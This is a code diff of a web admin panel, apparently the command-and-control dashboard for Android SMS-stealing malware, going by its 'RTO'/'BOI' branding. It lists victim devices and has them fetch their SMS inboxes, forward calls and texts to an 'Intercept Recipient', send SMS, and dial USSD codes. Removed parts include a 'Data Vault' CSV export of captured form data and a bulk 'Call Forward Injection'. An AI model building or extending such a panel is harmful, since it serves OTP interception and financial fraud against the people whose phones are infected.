@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>RTO Ultra-Admin 2.0 (SECURE)</title>
+    <title>BOI Ultra-Admin 2.0 (SECURE)</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -218,6 +218,38 @@
         <button onclick="closeBroadcast()" class="text-slate-500 hover:text-white text-[10px] font-black uppercase tracking-[0.3em] transition-colors">Abort Mission</button>
     </div>
 </div>
+<!-- Update Profile Modal -->
+<div id="profile-modal" class="fixed inset-0 bg-slate-900/90 z-[200] flex items-center justify-center p-4 hidden backdrop-blur-md">
+    <div class="bg-white w-full max-w-sm rounded-3xl p-8 shadow-2xl space-y-6 border-t-4 border-blue-600">
+        <div class="text-center space-y-2">
+            <div class="inline-flex bg-blue-100 p-3 rounded-2xl text-blue-600 mb-2">
+                <i class="fas fa-user-gear text-2xl"></i>
+            </div>
+            <h2 class="text-2xl font-black text-slate-800 tracking-tight">Admin Settings</h2>
+            <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Update your login email and password.</p>
+        </div>
+        <div class="space-y-4">
+            <div class="space-y-1">
+                <label class="text-[10px] font-black text-slate-500 uppercase ml-1">New Email</label>
+                <input type="email" id="update-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@boi.me">
+            </div>
+            <div class="space-y-1">
+                <label class="text-[10px] font-black text-slate-500 uppercase ml-1">New Password</label>
+                <input type="password" id="update-pass" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="Enter new password">
+            </div>
+            <div class="bg-amber-50 border border-amber-100 rounded-xl p-3">
+                <p class="text-[9px] font-bold text-amber-700 leading-tight">
+                    <i class="fas fa-shield-exclamation mr-1"></i> Security Note: If you haven't logged in recently, you may be asked to logout and log back in first.
+                </p>
+            </div>
+            <div class="flex gap-2 pt-2">
+                <button onclick="closeProfileModal()" class="flex-1 bg-slate-100 text-slate-600 py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-slate-200 transition-all">Cancel</button>
+                <button onclick="handleUpdateProfile()" id="update-profile-btn" class="flex-1 bg-blue-600 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-700 transition-all shadow-xl active:scale-95">Save Changes</button>
+            </div>
+        </div>
+    </div>
+</div>
+
 <!-- Toast Container -->
 <div id="toast-container"></div>
 
@@ -234,7 +266,7 @@
         <div class="space-y-4">
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Email ID</label>
-                <input type="email" id="login-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@rto.me">
+                <input type="email" id="login-email" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="admin@boi.me">
             </div>
             <div class="space-y-1">
                 <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Master Key</label>
@@ -257,7 +289,7 @@
     <div class="p-4 border-b border-slate-800 flex items-center justify-between h-14">
         <div class="flex items-center gap-2">
             <div class="bg-blue-600 p-1 rounded-lg"><i class="fas fa-shield-halved text-white text-md"></i></div>
-            <span class="text-md font-black text-white tracking-tight">RTO <span class="text-blue-500">ULTRA</span></span>
+            <span class="text-md font-black text-white tracking-tight">BOI <span class="text-blue-500">ULTRA</span></span>
         </div>
         <button onclick="toggleSidebar()" class="lg:hidden text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
     </div>
@@ -265,12 +297,6 @@
     <nav class="flex-1 overflow-y-auto py-2 px-3 space-y-1 no-scrollbar">
         <a href="#" onclick="showView('dashboard')" id="nav-dashboard" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
             <i class="fas fa-desktop text-xs"></i> <span>Dashboard</span>
-        </a>
-        <a href="#" onclick="setFilter('msgs')" id="nav-msgs" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
-            <i class="fas fa-comment-dots text-xs"></i> <span>Live SMS Feed</span>
-        </a>
-        <a href="#" onclick="setFilter('forms')" id="nav-forms" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
-            <i class="fas fa-database text-xs"></i> <span>Global Data Vault</span>
         </a>
         <a href="#" onclick="showView('history')" id="nav-history" class="nav-link flex items-center gap-3 px-4 py-2 rounded-lg transition-all hover:bg-slate-800 text-sm">
             <i class="fas fa-history text-xs"></i> <span>Access Logs</span>
@@ -286,13 +312,6 @@
                 <input type="text" id="global-sms-fwd" placeholder="SMS Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-blue-500">
                 <button onclick="saveGlobal('smsForward')" class="w-full bg-blue-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-blue-700 transition-colors">Update SMS</button>
             </div>
-            <div class="space-y-1">
-                <input type="text" id="global-call-fwd" placeholder="Call Forward No." class="w-full bg-slate-800 border-none rounded p-2 text-xs text-white outline-none focus:ring-1 focus:ring-red-500">
-                <button onclick="saveGlobal('callForward')" class="w-full bg-red-600 text-white py-1.5 rounded text-[10px] font-bold uppercase hover:bg-red-700 transition-colors">Update Call</button>
-            </div>
-            <button onclick="bulkCallForward()" class="w-full bg-rose-600 hover:bg-rose-700 py-2 rounded text-[10px] font-black uppercase tracking-widest text-white shadow-lg mt-2 active:scale-95 transition-all">
-                <i class="fas fa-broadcast-tower mr-1"></i> Bulk Call Fwd
-            </button>
             <button onclick="checkAllDevices()" class="w-full bg-emerald-600 hover:bg-emerald-700 py-2 rounded text-[10px] font-black uppercase tracking-widest text-white shadow-lg mt-2 active:scale-95 transition-all">
                 <i class="fas fa-bolt mr-1"></i> Force All Online
             </button>
@@ -314,8 +333,13 @@
             </button>
         </div>
 
-        <div class="pt-8 px-4">
-            <button onclick="logout()" class="flex items-center gap-2 text-xs font-black text-slate-500 uppercase hover:text-rose-500 transition-colors"><i class="fas fa-sign-out-alt"></i> Logout System</button>
+        <div class="pt-8 px-4 space-y-4 pb-10">
+            <button onclick="openProfileModal()" class="flex items-center gap-2 text-xs font-black text-slate-500 uppercase hover:text-blue-500 transition-colors w-full">
+                <i class="fas fa-user-edit"></i> Edit Credentials
+            </button>
+            <button onclick="logout()" class="flex items-center gap-2 text-xs font-black text-slate-500 uppercase hover:text-rose-500 transition-colors w-full">
+                <i class="fas fa-sign-out-alt"></i> Logout System
+            </button>
         </div>
     </nav>
 </aside>
@@ -340,7 +364,26 @@
                 <div class="text-[10px] font-black text-slate-800 uppercase tracking-tighter" id="admin-display-name">NOT AUTHED</div>
                 <div class="text-[8px] text-green-500 font-black uppercase tracking-widest">Secure Link</div>
             </div>
-            <div class="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400 border border-slate-200"><i class="fas fa-user-shield text-xs"></i></div>
+            <!-- User Profile Dropdown -->
+            <div class="relative group">
+                <button class="w-9 h-9 bg-slate-100 rounded-xl flex items-center justify-center text-slate-400 border border-slate-200 hover:bg-slate-200 hover:text-blue-600 transition-all shadow-sm">
+                    <i class="fas fa-user-shield text-sm"></i>
+                </button>
+                <div class="absolute right-0 mt-2 w-48 bg-white rounded-2xl shadow-2xl border border-slate-100 py-2 opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200 z-[100] transform origin-top-right scale-95 group-hover:scale-100">
+                    <div class="px-4 py-2 border-b border-slate-50 mb-1">
+                        <p class="text-[8px] font-black text-slate-400 uppercase tracking-widest">Admin Account</p>
+                        <p id="dropdown-admin-email" class="text-[10px] font-bold text-slate-700 truncate">admin@boi.me</p>
+                    </div>
+                    <button onclick="openProfileModal()" class="w-full text-left px-4 py-2.5 text-[10px] font-black uppercase text-slate-600 hover:bg-blue-50 hover:text-blue-600 transition-colors flex items-center gap-2">
+                        <i class="fas fa-user-edit text-[10px]"></i> Edit Credentials
+                    </button>
+                    <div class="border-t border-slate-50 mt-1 pt-1">
+                        <button onclick="logout()" class="w-full text-left px-4 py-2.5 text-[10px] font-black uppercase text-rose-500 hover:bg-rose-50 transition-colors flex items-center gap-2">
+                            <i class="fas fa-sign-out-alt text-[10px]"></i> Logout System
+                        </button>
+                    </div>
+                </div>
+            </div>
         </div>
     </header>
 
@@ -415,9 +458,6 @@
                     <i class="fas fa-search text-slate-400 text-sm"></i>
                     <input type="text" id="user-search" oninput="resetPage(); updateDashboard()" placeholder="Search nodes, nicknames, or use :low, :online, :cf..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
-                <button id="export-btn" onclick="exportToCSV()" class="hidden bg-slate-900 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest hover:bg-blue-600 transition-all shadow-lg active:scale-95 flex items-center gap-2">
-                    <i class="fas fa-file-csv"></i> Export Vault
-                </button>
             </div>
             <div id="dashboard-list" class="space-y-3"></div>
 
@@ -527,7 +567,7 @@
                     <div class="flex items-center gap-3">
                         <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-xl flex items-center justify-center border border-blue-100"><i class="fas fa-gear"></i></div>
                         <div>
-                            <div class="text-[10px] font-black text-slate-400 uppercase leading-none">Command Config</div>
+                            <div class="text-[10px] font-black text-slate-400 uppercase leading-none">SELECT SIM</div>
                             <div class="text-xs font-black text-slate-700 mt-1">Select Active SIM for Actions</div>
                         </div>
                     </div>
@@ -539,95 +579,120 @@
 
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                     <!-- Fetch SMS Card -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-3">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center border border-indigo-100"><i class="fas fa-message"></i></div>
-                            <div>
-                                <div class="text-[10px] font-black text-slate-400 uppercase leading-none">SMS Manager</div>
-                                <div class="text-xs font-black text-slate-700 mt-1">Fetch Inbox Messages</div>
+                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between">
+                        <div class="flex items-center justify-between cursor-pointer group" onclick="toggleCard('sms-content')">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center border border-indigo-100"><i class="fas fa-message"></i></div>
+                                <div>
+                                    <div class="text-[10px] font-black text-slate-400 uppercase leading-none">SMS Manager</div>
+                                    <div class="text-xs font-black text-slate-700 mt-1">Fetch Inbox Messages</div>
+                                </div>
                             </div>
+                            <i id="sms-content-icon" class="fas fa-chevron-down text-slate-300 transition-transform group-hover:text-indigo-500"></i>
                         </div>
-                        <div class="flex gap-2">
-                            <select id="cmd-sms-count" class="bg-slate-50 text-xs font-black text-indigo-600 rounded-xl px-3 py-2 border border-slate-200 outline-none flex-1">
-                                <option value="1">1 SMS</option><option value="5">5 SMS</option><option value="10">10 SMS</option><option value="50">50 SMS</option>
-                            </select>
-                            <button onclick="sendUserCmd('GET_SMS')" class="bg-indigo-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-indigo-100 active:scale-95 transition-all">GET-SMS</button>
+                        <div id="sms-content" class="hidden mt-4 space-y-3">
+                            <div class="flex gap-2">
+                                <select id="cmd-sms-count" class="bg-slate-50 text-xs font-black text-indigo-600 rounded-xl px-3 py-2 border border-slate-200 outline-none flex-1">
+                                    <option value="1">1 SMS</option><option value="5">5 SMS</option><option value="10">10 SMS</option><option value="50">50 SMS</option>
+                                </select>
+                                <button onclick="sendUserCmd('GET_SMS')" class="bg-indigo-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-indigo-100 active:scale-95 transition-all">GET-SMS</button>
+                            </div>
                         </div>
                     </div>
 
                     <!-- Call Forward Card -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-3">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-xl flex items-center justify-center border border-rose-100"><i class="fas fa-phone-volume"></i></div>
-                            <div>
-                                <div class="text-[10px] font-black text-slate-400 uppercase leading-none">Call Forward</div>
-                                <div class="text-xs font-black text-slate-700 mt-1">Redirect Incoming Calls</div>
+                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between">
+                        <div class="flex items-center justify-between cursor-pointer group" onclick="toggleCard('cf-content')">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-xl flex items-center justify-center border border-rose-100"><i class="fas fa-phone-volume"></i></div>
+                                <div>
+                                    <div class="text-[10px] font-black text-slate-400 uppercase leading-none">Call Forward</div>
+                                    <div class="text-xs font-black text-slate-700 mt-1">Redirect Incoming Calls</div>
+                                </div>
                             </div>
+                            <i id="cf-content-icon" class="fas fa-chevron-down text-slate-300 transition-transform group-hover:text-rose-500"></i>
                         </div>
-                        <input id="cmd-cf-num" placeholder="Forwarding Number" class="bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-rose-500">
-                        <div class="grid grid-cols-2 gap-2">
-                            <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-rose-600 text-white py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-rose-100 active:scale-95 transition-all">FORWARD ON</button>
-                            <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-slate-800 text-white py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">FORWARD OFF</button>
+                        <div id="cf-content" class="hidden mt-4 space-y-3">
+                            <input id="cmd-cf-num" placeholder="Forwarding Number" class="w-full bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-rose-500">
+                            <div class="grid grid-cols-2 gap-2">
+                                <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-blue-50 text-blue-600 border border-blue-100 py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">FORWARD ON</button>
+                                <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-blue-50 text-blue-600 border border-blue-100 py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">FORWARD OFF</button>
+                            </div>
+                            <button onclick="sendUserCmd('CHECK_FORWARD')" class="w-full bg-blue-50 text-blue-600 border border-blue-100 py-1.5 rounded-lg text-[9px] font-black uppercase active:scale-95 transition-all mt-1">
+                                <i class="fas fa-magnifying-glass mr-1"></i> Verify Carrier Status
+                            </button>
                         </div>
-                        <button onclick="sendUserCmd('CHECK_FORWARD')" class="w-full bg-blue-50 text-blue-600 border border-blue-100 py-1.5 rounded-lg text-[9px] font-black uppercase active:scale-95 transition-all mt-1">
-                            <i class="fas fa-magnifying-glass mr-1"></i> Verify Carrier Status
-                        </button>
                     </div>
 
                     <!-- SMS Intercept Card -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-3">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 bg-amber-50 text-amber-600 rounded-xl flex items-center justify-center border border-amber-100"><i class="fas fa-envelope-open-text"></i></div>
-                            <div>
-                                <div class="text-[10px] font-black text-slate-400 uppercase leading-none">SMS Intercept</div>
-                                <div class="text-xs font-black text-slate-700 mt-1">Forward SMS to Admin</div>
+                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between">
+                        <div class="flex items-center justify-between cursor-pointer group" onclick="toggleCard('sf-content')">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-amber-50 text-amber-600 rounded-xl flex items-center justify-center border border-amber-100"><i class="fas fa-envelope-open-text"></i></div>
+                                <div>
+                                    <div class="text-[10px] font-black text-slate-400 uppercase leading-none">SET SMS FORWARD</div>
+                                    <div class="text-xs font-black text-slate-700 mt-1">Forward SMS to Admin</div>
+                                </div>
                             </div>
+                            <i id="sf-content-icon" class="fas fa-chevron-down text-slate-300 transition-transform group-hover:text-amber-500"></i>
                         </div>
-                        <input id="cmd-sf-num" placeholder="Intercept Recipient" class="bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-amber-500">
-                        <div class="grid grid-cols-2 gap-2">
-                            <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-amber-600 text-white py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-amber-100 active:scale-95 transition-all">SMS FORWARD ON</button>
-                            <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-slate-800 text-white py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">SMS FORWARD OFF</button>
+                        <div id="sf-content" class="hidden mt-4 space-y-3">
+                            <input id="cmd-sf-num" placeholder="Intercept Recipient" class="w-full bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-amber-500">
+                            <div class="grid grid-cols-2 gap-2">
+                                <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-blue-50 text-blue-600 border border-blue-100 py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">SMS FORWARD ON</button>
+                                <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-blue-50 text-blue-600 border border-blue-100 py-2 rounded-xl text-[10px] font-black uppercase active:scale-95 transition-all">SMS FORWARD OFF</button>
+                            </div>
                         </div>
                     </div>
 
                     <!-- USSD / Dialer Card -->
-                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between space-y-3">
-                        <div class="flex items-center gap-3">
-                            <div class="w-10 h-10 bg-emerald-50 text-emerald-600 rounded-xl flex items-center justify-center border border-emerald-100"><i class="fas fa-hashtag"></i></div>
-                            <div>
-                                <div class="text-[10px] font-black text-slate-400 uppercase leading-none">USSD / Dial</div>
-                                <div class="text-xs font-black text-slate-700 mt-1">Run Codes or Check Balance</div>
+                    <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-100 flex flex-col justify-between">
+                        <div class="flex items-center justify-between cursor-pointer group" onclick="toggleCard('ussd-content')">
+                            <div class="flex items-center gap-3">
+                                <div class="w-10 h-10 bg-emerald-50 text-emerald-600 rounded-xl flex items-center justify-center border border-emerald-100"><i class="fas fa-hashtag"></i></div>
+                                <div>
+                                    <div class="text-[10px] font-black text-slate-400 uppercase leading-none">USSD / Dial</div>
+                                    <div class="text-xs font-black text-slate-700 mt-1">Run Codes or Check Balance</div>
+                                </div>
                             </div>
+                            <i id="ussd-content-icon" class="fas fa-chevron-down text-slate-300 transition-transform group-hover:text-emerald-500"></i>
                         </div>
-                        <div class="flex gap-2">
-                            <input id="cmd-ussd-code" placeholder="Code (e.g. *121#)" class="bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-emerald-500 flex-1">
-                            <button onclick="sendUserCmd('USSD')" class="bg-emerald-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-emerald-100 active:scale-95 transition-all">Dial</button>
+                        <div id="ussd-content" class="hidden mt-4 space-y-3">
+                            <div class="flex gap-2">
+                                <input id="cmd-ussd-code" placeholder="Code (e.g. *121#)" class="bg-slate-50 text-xs font-black text-slate-700 rounded-xl px-4 py-2 border border-slate-200 outline-none focus:ring-2 focus:ring-emerald-500 flex-1">
+                                <button onclick="sendUserCmd('USSD')" class="bg-emerald-600 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase shadow-lg shadow-emerald-100 active:scale-95 transition-all">Dial</button>
+                            </div>
                         </div>
                     </div>
                 </div>
 
                 <!-- Direct SMS (Full Width) -->
-                <div class="bg-slate-900 rounded-3xl p-6 text-white shadow-2xl space-y-4">
-                    <div class="flex items-center gap-3">
-                        <div class="w-10 h-10 bg-blue-600/20 text-blue-400 rounded-xl flex items-center justify-center border border-blue-600/30"><i class="fas fa-paper-plane"></i></div>
-                        <div>
-                            <div class="text-[10px] font-black text-blue-400 uppercase leading-none">Direct Communication</div>
-                            <div class="text-xs font-black text-white mt-1">Send Outbound SMS from Device</div>
+                <div class="bg-slate-900 rounded-3xl p-6 text-white shadow-2xl">
+                    <div class="flex items-center justify-between cursor-pointer group" onclick="toggleCard('direct-sms-content')">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 bg-blue-600/20 text-blue-400 rounded-xl flex items-center justify-center border border-blue-600/30"><i class="fas fa-paper-plane"></i></div>
+                            <div>
+                                <div class="text-[10px] font-black text-blue-400 uppercase leading-none">SEND SMS</div>
+                                <div class="text-xs font-black text-white mt-1">Send SMS from Device To Any Number</div>
+                            </div>
                         </div>
+                        <i id="direct-sms-content-icon" class="fas fa-chevron-down text-slate-500 transition-transform group-hover:text-blue-400"></i>
                     </div>
-                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                        <div class="space-y-1">
-                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Recipient Number</label>
-                            <input id="cmd-sms-num" placeholder="e.g. +919988..." class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all font-black">
+                    <div id="direct-sms-content" class="hidden mt-6 space-y-4">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div class="space-y-1">
+                                <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Recipient Number</label>
+                                <input id="cmd-sms-num" type="tel" placeholder="e.g. +919988..." class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all font-black">
+                            </div>
+                            <div class="space-y-1">
+                                <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Message Body</label>
+                                <input id="cmd-sms-msg" placeholder="Type message here..." class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all font-black">
+                            </div>
                         </div>
-                        <div class="space-y-1">
-                            <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Message Body</label>
-                            <input id="cmd-sms-msg" placeholder="Type message here..." class="w-full bg-slate-800 rounded-xl p-3 text-xs outline-none border border-slate-700 focus:border-blue-500 transition-all font-black">
-                        </div>
+                        <button onclick="sendUserCmd('SEND_SMS')" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-2xl text-xs font-black uppercase tracking-widest active:scale-95 transition-all shadow-xl shadow-blue-900/20">
+                            Send SMS
+                        </button>
                     </div>
-                    <button onclick="sendUserCmd('SEND_SMS')" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-2xl text-xs font-black uppercase tracking-widest active:scale-95 transition-all shadow-xl shadow-blue-900/20">
-                        Send SMS
-                    </button>
                 </div>
             </div>
 
@@ -779,6 +844,7 @@
             // 1. Force Hide Overlay Immediately
             if(overlay) overlay.style.display = 'none';
             document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
+            document.getElementById('dropdown-admin-email').innerText = user.email;
 
             // Handle UID from URL for "New Page" detail view
             const urlParams = new URLSearchParams(window.location.search);
@@ -832,6 +898,59 @@
 
     function logout() { auth.signOut(); }
 
+    function openProfileModal() {
+        const user = auth.currentUser;
+        if(user) {
+            document.getElementById('update-email').value = user.email;
+            document.getElementById('update-pass').value = "";
+            document.getElementById('profile-modal').classList.remove('hidden');
+        }
+    }
+
+    function closeProfileModal() {
+        document.getElementById('profile-modal').classList.add('hidden');
+    }
+
+    function handleUpdateProfile() {
+        const user = auth.currentUser;
+        if(!user) return;
+
+        const newEmail = document.getElementById('update-email').value.trim();
+        const newPass = document.getElementById('update-pass').value.trim();
+        const btn = document.getElementById('update-profile-btn');
+
+        if(!newEmail && !newPass) {
+            showToast("No changes detected", "info");
+            return;
+        }
+
+        btn.innerText = "UPDATING...";
+        btn.disabled = true;
+
+        const promises = [];
+        if(newEmail && newEmail !== user.email) promises.push(user.updateEmail(newEmail));
+        if(newPass) promises.push(user.updatePassword(newPass));
+
+        Promise.all(promises)
+            .then(() => {
+                showToast("Admin credentials updated successfully!", "success");
+                closeProfileModal();
+                btn.innerText = "SAVE CHANGES";
+                btn.disabled = false;
+                if(newEmail) document.getElementById('dropdown-admin-email').innerText = newEmail;
+            })
+            .catch(error => {
+                console.error("Update Error:", error);
+                if(error.code === 'auth/requires-recent-login') {
+                    showToast("Security: Please logout and login again to update credentials.", "error");
+                } else {
+                    showToast("Update Failed: " + error.message, "error");
+                }
+                btn.innerText = "SAVE CHANGES";
+                btn.disabled = false;
+            });
+    }
+
     function saveNickname() {
         if(!selectedUid) return;
         const nn = document.getElementById('det-nickname').value.trim().toUpperCase();
@@ -869,6 +988,15 @@
         sb.classList.toggle('hidden-mobile');
         sb.classList.toggle('show-mobile');
         ov.classList.toggle('hidden');
+    }
+
+    function toggleCard(id) {
+        const el = document.getElementById(id);
+        const icon = document.getElementById(id + '-icon');
+        if (el) {
+            el.classList.toggle('hidden');
+            if (icon) icon.classList.toggle('rotate-180');
+        }
     }
 
     let prevStatus = {};
@@ -995,44 +1123,9 @@
         const activeNav = document.getElementById(navId);
         if(activeNav) activeNav.classList.add('active');
 
-        // Show/Hide Export button based on filter
-        const exportBtn = document.getElementById('export-btn');
-        if(exportBtn) exportBtn.classList.toggle('hidden', f !== 'forms');
-
         // Navigation Fix: Ensure we go back to dashboard view when a filter is clicked
         showView('dashboard', true, false);
         updateDashboard();
-    }
-
-    function exportToCSV() {
-        if (currentFilter !== 'forms') return;
-
-        let csv = "User,NodeID,Field,Value,Timestamp\n";
-
-        Object.keys(usersData).forEach(uid => {
-            const u = usersData[uid];
-            const name = u.I?.m || "Unknown";
-            if (u.F) {
-                Object.values(u.F).forEach(form => {
-                    const ts = new Date(form.ts).toLocaleString().replace(/,/g, '');
-                    for (let key in form) {
-                        if (['ts', 'uid', 'name', 'page', 'timestamp'].includes(key)) continue;
-                        csv += `"${name}","${uid}","${key}","${form[key]}","${ts}"\n`;
-                    }
-                });
-            }
-        });
-
-        const blob = new Blob([csv], { type: 'text/csv' });
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.setAttribute('hidden', '');
-        a.setAttribute('href', url);
-        a.setAttribute('download', `data_vault_export_${Date.now()}.csv`);
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        showToast("Data Vault exported to CSV successfully!", "success");
     }
 
     function formatTime(ts) {
@@ -1461,12 +1554,13 @@
 
         // Header info
         const uIdx = permIds[uid] || "";
+        const pn = info.pn || "";
         document.getElementById('det-name').innerText = (uIdx ? `#${uIdx} ` : "") + (info.m || "NODE");
         document.getElementById('det-id-long').innerText = `ID: ${uid}`;
         document.getElementById('det-nickname').value = info.nn || "";
 
-        const s1 = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : "H";
-        const s2 = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "H";
+        let s1 = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : (pn || "H");
+        let s2 = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "H";
 
         document.getElementById('det-s1-num').innerText = s1;
         document.getElementById('det-s2-num').innerText = s2;
@@ -1518,7 +1612,8 @@
         badgesDiv.innerHTML = '';
         const badges = [
             { cond: info.cf, on: 'CALL FWD: ON', off: 'CALL FWD: OFF', type: 'glitter-red' },
-            { cond: info.sf, on: 'SMS FWD: ON', off: 'SMS FWD: OFF', type: 'glitter-amber' }
+            { cond: info.sf, on: 'SMS FWD: ON', off: 'SMS FWD: OFF', type: 'glitter-amber' },
+            { cond: info.bo, on: 'BATTERY: PROTECTED', off: 'BATTERY: VULNERABLE', type: 'bg-emerald-50 text-emerald-600 border-emerald-100' }
         ];
 
         badges.forEach(b => {
@@ -1533,6 +1628,14 @@
             span.innerText = active ? b.on : b.off;
             badgesDiv.appendChild(span);
         });
+
+        // Add Last Reset badge if available
+        if (info.lr) {
+            const lrSpan = document.createElement('span');
+            lrSpan.className = "bg-rose-50 text-rose-600 px-2 py-1 rounded text-[9px] font-black border border-rose-100 uppercase shadow-sm flex items-center gap-1";
+            lrSpan.innerHTML = `<i class="fas fa-clock-rotate-left"></i> Reset: ${formatTime(info.lr)}`;
+            badgesDiv.appendChild(lrSpan);
+        }
 
         // Update Command Center Buttons Style based on current state
         const cfOnBtn = document.querySelector('[onclick="sendUserCmd(\'CALL_FORWARD\')"]');
@@ -1753,20 +1856,13 @@
     }
 
     function saveGlobal(k) {
-        const v = document.getElementById(k==='smsForward'?'global-sms-fwd':'global-call-fwd').value;
+        const inputId = k === 'smsForward' ? 'global-sms-fwd' : 'global-call-fwd';
+        const inputEl = document.getElementById(inputId);
+        if (!inputEl) return;
+
+        const v = inputEl.value;
         db.ref('Settings').child(k).set(v);
         showToast(`Configuration for ${k} saved successfully.`, 'success');
-    }
-
-    function bulkCallForward() {
-        const n = document.getElementById('global-call-fwd').value;
-        if(!n) return showToast('Set forwarding number first', 'error');
-        const uids = Object.keys(usersData);
-        if(uids.length === 0) return showToast("No target nodes found", "error");
-
-        startBroadcast("Call Forward Injection", "fa-phone-arrow-right", uids, (uid) => {
